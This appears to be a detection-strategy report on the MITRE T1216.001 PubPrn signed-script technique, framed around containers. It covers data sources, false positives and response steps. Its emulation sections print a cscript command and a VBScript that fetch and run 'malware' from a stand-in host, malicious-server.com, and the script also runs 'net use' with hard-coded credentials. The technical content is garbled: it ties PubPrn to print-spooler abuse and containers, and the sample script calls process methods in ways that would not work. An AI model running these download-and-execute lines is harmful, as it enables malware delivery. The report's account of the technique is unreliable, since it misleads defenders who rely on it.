# Alerting & Detection Strategy (ADS) Report: Detecting Adversarial Attempts to Bypass Security Monitoring Using Containers

## Goal
The primary goal of this detection strategy is to identify and mitigate adversarial attempts to bypass security monitoring through the misuse of container technologies, specifically focusing on techniques such as `T1216.001 - PubPrn`.

## Categorization
- **MITRE ATT&CK Mapping:** T1216.001 - PubPrn
- **Tactic / Kill Chain Phases:** Defense Evasion
- **Platforms:** Windows

For more information, refer to the [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1216/001).

## Strategy Abstract
This detection strategy leverages a combination of log analysis and behavioral monitoring across multiple data sources, including:
- **Windows Event Logs**: To capture printer-related events and scripts execution.
- **Network Traffic Analysis**: To detect unusual network activity associated with containerized environments.
- **File Integrity Monitoring (FIM)**: To identify unauthorized changes or additions to scripts like `PubPrn.vbs`.

The strategy involves pattern recognition for anomalous behaviors, such as:
- Unexpected usage of `cscript` or `wscript` in combination with `.vbs` files.
- Unusual network traffic patterns from containerized processes.

## Technical Context
Adversaries may use techniques such as `PubPrn.vbs` to bypass security measures by executing malicious scripts through legitimate Windows functionalities like printing. The technique involves crafting a VBScript file that abuses the print spooler service, which can be executed without triggering traditional antivirus detections due to its use of built-in system utilities.

### Adversary Emulation Details
- **Sample Command**: 
  ```bash
  cscript.exe //nologo PubPrn.vbs http://malicious-server.com/malware.exe
  ```
- **Test Scenario**:
  - Deploy a containerized environment with Windows as the host.
  - Execute `PubPrn.vbs` script within this environment to simulate an adversaryâ€™s actions.

## Blind Spots and Assumptions
- **Blind Spots**: Detection may not cover all variations of VBScript-based evasion techniques or those that employ additional obfuscation methods.
- **Assumptions**:
  - The presence of a print spooler service in the environment.
  - Accurate logging of script execution events.

## False Positives
Potential benign activities that might trigger false alerts include:
- Legitimate use of `cscript` or `wscript` for administrative tasks.
- Standard network traffic from containers performing routine operations involving VBScript files.

## Priority
**Priority: High**

Justification:
- This technique allows adversaries to evade detection while executing malicious payloads, posing significant security risks.
- The high degree of stealth associated with such methods makes them attractive to sophisticated threat actors.

## Validation (Adversary Emulation)
### Step-by-step Instructions to Emulate `PubPrn.vbs` Signed Script Bypass:

1. **Setup Environment**:
   - Prepare a Windows-based container environment with necessary network access and administrative privileges.
   
2. **Create the VBScript**:
   ```vbscript
   Set oWS = WScript.CreateObject("WScript.Shell")
   strComputer = "."
   Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
   Set colItems = objWMIService.ExecQuery _
     ("Select * from Win32_Process where Name = 'spoolsv.exe'")
   
   For Each objItem in colItems
       intJobId = oWS.Run("cmd /C echo y|net use \\server\share /user:domain\username password", 0, True)
       strCommandToRun = "cscript //nologo http://malicious-server.com/malware.vbs"
       objItem.Create(strCommandToRun)
   Next
   ```
   
3. **Deploy and Execute**:
   - Place the script in a location accessible by the containerized process.
   - Execute using `cscript.exe` or `wscript.exe`.

4. **Monitor Logs**:
   - Check Windows Event Viewer for signs of script execution and network traffic logs for unusual activity.

## Response
When an alert related to this technique is triggered, analysts should:

1. **Verify the Alert**: Confirm if the detected activity aligns with known patterns of `T1216.001`.
2. **Isolate Affected Systems**: Temporarily quarantine the affected container or host system.
3. **Investigate Further**:
   - Examine logs for additional evidence of malicious behavior.
   - Use sandboxing tools to analyze any downloaded executables.

4. **Report and Remediate**: Document findings, remediate vulnerabilities, and update detection rules as necessary.
